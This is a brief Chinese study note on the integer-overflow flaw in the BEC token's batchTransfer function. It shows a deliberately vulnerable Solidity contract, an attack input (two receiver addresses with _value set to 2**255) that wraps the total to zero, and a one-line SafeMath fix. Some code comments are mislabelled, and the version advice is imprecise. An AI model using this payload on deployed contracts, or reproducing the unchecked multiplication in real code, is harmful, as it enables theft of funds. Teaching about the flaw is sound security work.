## 整数溢出漏洞
* https://www.bilibili.com/video/BV1VV4y1p76M/
* http://www.codebaoku.com/smartcontract/smartcontract-overflow.html
* https://github.com/solidity-korea/solidity-A-to-Z/blob/master/contracts/BEC-overflow.sol
```
contract BECOverflow{
    //合约内部账本，记录每个账户的余额
  mapping(address => uint256) balances;
    //批量转账，接受者_receivers数组，转账金额_value
  function batchTransfer(address[] calldata _receivers, uint256 _value) public returns (bool) {
    uint cnt = _receivers.length;
    //计算转账总额
    uint256 amount = uint256(cnt) * _value;
    //检查转账总额是否超过合约余额
    require(cnt > 0 && cnt <= 20);
    //检查转账总额是否超过合约余额
    require(_value > 0 && balances[msg.sender] >= amount);
    //从合约调用者账户中减去转账总额
    balances[msg.sender] = balances[msg.sender] - amount;
    //循环转账
    for (uint i = 0; i < cnt; i++) {
        //检查接收者账户余额是否足够
        balances[_receivers[i]] = balances[_receivers[i]] + _value;
        //触发转账事件
        //Transfer(msg.sender, _receivers[i], _value);
        payable(_receivers[i]).transfer(1 ether);
    }
    return true;
  }
    constructor() payable{}

  	receive() external payable{}

}
```
How to Attack?
```
_receivers:  ["attackers_address","attackers_address"]
_value:      57896044618658097711785492504343953926634992332820282019728792003956564819968

// due to uint256's max value is 2**256 (when >=2**256 will be overflowed),
//and in this contract will multiply _receivers.length,
//so attacker set 2 receiver address and set _value == 2**255
// the amount's final value will be 2**255*2, (2**256) 
```
How to fix?
```
solidity version <= 0.8.0, openZeppelin SafeMath
solidity version >0.8.0, solidity's SafeMath
```
